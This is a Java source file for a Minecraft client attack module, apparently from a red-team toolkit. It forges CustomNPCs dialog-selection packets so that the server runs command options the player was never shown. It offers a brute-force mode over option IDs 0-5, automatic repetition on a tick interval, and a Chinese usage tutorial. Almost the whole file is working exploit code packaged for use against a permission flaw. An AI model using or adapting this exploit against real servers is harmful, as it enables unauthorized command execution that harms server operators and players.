package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-02: Dialog Command Forge -- trigger arbitrary dialog option commands.
 *
 * Vuln #11 (index 57): SPacketDialogSelected
 * Wire: writeInt(dialogId) + writeInt(optionId)
 *
 * Preconditions: requiresNpc=true (must have editing NPC set), toolAllowed=true (any item).
 * No permission check.
 *
 * IMPORTANT bytecode correction: The handler uses playerData.dialogId (server state)
 * for the actual dialog lookup, NOT the packet's dialogId. The packet's dialogId is
 * only a validation gate (if playerData.dialogId != packet.dialogId, return).
 * So we must send the CORRECT dialogId that matches server state.
 *
 * However, optionId IS fully client-controlled (0-5). If optionType==4 (command),
 * the handler calls NoppesUtilServer.runCommand() with the option's command string.
 * This lets us trigger command options we were never shown in the GUI.
 */
public class CNPC02_DialogForge implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_DIALOG_SELECTED = 57;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("dialog_id", "对话框ID", 0, -2147483647, 2147483647),
        ConfigParam.ofInt("option_id", "选项ID(0-5)", 0, 0, 5),
        ConfigParam.ofBool("brute_options", "遍历所有选项(0-5)", false),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "cnpc02_dialog_forge"; }
    @Override public String name() { return "对话框命令伪造"; }
    @Override public String description() { return "触发对话框中隐藏的命令选项"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 先右键一个CustomNPC打开对话(建立editing NPC状态)\n"
            + "2. 记下当前对话框ID(可从GUI或数据包嗅探获取)\n"
            + "3. 填写对话框ID和目标选项ID\n"
            + "4. 点击执行 -- 会触发该选项关联的命令\n\n"
            + "[原理]\n"
            + "服务端用 playerData.dialogId 查找对话框,\n"
            + "但 optionId 完全由客户端控制(0-5)。\n"
            + "如果某个选项配置了命令(optionType=4),\n"
            + "即使该选项未在GUI中显示,也会被执行。\n\n"
            + "[遍历模式]\n"
            + "开启「遍历所有选项」会依次发送 optionId 0-5,\n"
            + "触发当前对话框所有可能的命令选项。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int dialogId = getParam("dialog_id").map(ConfigParam::getInt).orElse(0);
        boolean brute = getParam("brute_options").map(ConfigParam::getBool).orElse(false);

        if (brute) {
            for (int i = 0; i <= 5; i++) {
                sendDialogSelect(dialogId, i);
            }
        } else {
            int optionId = getParam("option_id").map(ConfigParam::getInt).orElse(0);
            sendDialogSelect(dialogId, optionId);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private void sendDialogSelect(int dialogId, int optionId) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_DIALOG_SELECTED);
            buf.writeInt(dialogId);
            buf.writeInt(optionId);
        });
    }
}
